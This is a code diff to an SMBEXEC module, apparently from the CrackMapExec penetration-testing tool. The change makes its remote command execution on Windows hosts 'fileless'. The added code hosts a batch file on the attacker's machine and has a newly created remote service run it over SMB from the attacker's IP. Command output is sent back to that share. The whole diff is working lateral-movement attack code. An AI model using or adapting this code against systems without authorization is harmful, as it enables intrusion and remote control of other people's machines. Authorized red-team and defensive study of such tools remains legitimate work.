@@ -1,4 +1,5 @@
 import logging
+import os
 from gevent import sleep
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.smbconnection import *
@@ -6,8 +7,9 @@ from cme.helpers import gen_random_string
 
 class SMBEXEC:
 
-    def __init__(self, host, protocol, username = '', password = '', domain = '', hashes = None, share = None, port=445):
+    def __init__(self, host, share_name, protocol, username = '', password = '', domain = '', hashes = None, share = None, port=445):
         self.__host = host
+        self.__share_name = share_name
         self.__port = port
         self.__username = username
         self.__password = password
@@ -59,52 +61,33 @@ class SMBEXEC:
         self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
         resp = scmr.hROpenSCManagerW(self.__scmr)
         self.__scHandle = resp['lpScHandle']
-        self.transferClient = self.__rpctransport.get_smb_connection()
 
     def execute(self, command, output=False):
         self.__retOutput = output
-        if self.__retOutput:
-            self.cd('')
-
-        self.execute_remote(command)
+        self.execute_fileless(command)
         self.finish()
         return self.__outputBuffer
-            
-    def cd(self, s):
-        ret_state = self.__retOutput
-        self.__retOutput = False
-        self.execute_remote('cd ' )
-        self.__retOutput = ret_state
 
-    def get_output(self):
+    def output_callback(self, data):
+        self.__outputBuffer += data
 
-        if self.__retOutput is False:
-            self.__outputBuffer = ''
-            return
-
-        def output_callback(data):
-            self.__outputBuffer += data
-
-        while True:
-            try:
-                self.transferClient.getFile(self.__share, self.__output, output_callback)        
-                self.transferClient.deleteFile(self.__share, self.__output)
-                break
-            except Exception:
-                sleep(2)
-
-    def execute_remote(self, data):
-        self.__output = '\\Windows\\Temp\\' + gen_random_string() 
-        self.__batchFile = '%TEMP%\\' + gen_random_string() + '.bat'
+    def execute_fileless(self, data):
+        self.__output = gen_random_string(6)
+        self.__batchFile = gen_random_string(6) + '.bat'
+        local_ip = self.__rpctransport.get_socket().getsockname()[0]
 
         if self.__retOutput:
-            command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
+            command = self.__shell + data + ' ^> \\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output)
         else:
-            command = self.__shell + 'echo ' + data + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
-        
-        command += ' & ' + 'del ' + self.__batchFile 
+            command = self.__shell + data
 
-        logging.debug('Executing command: ' + command)
+        with open(os.path.join('/tmp', 'cme_hosted', self.__batchFile), 'w') as batch_file:
+            batch_file.write(command)
+
+        logging.debug('Hosting batch file with command: ' + command)
+
+        command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
+        logging.debug('Command to execute: ' + command)
 
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
         service = resp['lpServiceHandle']
@@ -115,7 +98,18 @@ class SMBEXEC:
            pass
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
-        self.get_output()
+        self.get_output_fileless()
+
+    def get_output_fileless(self):
+        if not self.__retOutput: return 
+
+        while True:
+            try:
+                with open(os.path.join('/tmp', 'cme_hosted', self.__output), 'r') as output:
+                    self.output_callback(output.read())
+                break
+            except IOError:
+                sleep(2)
 
     def finish(self):
         # Just in case the service is still created
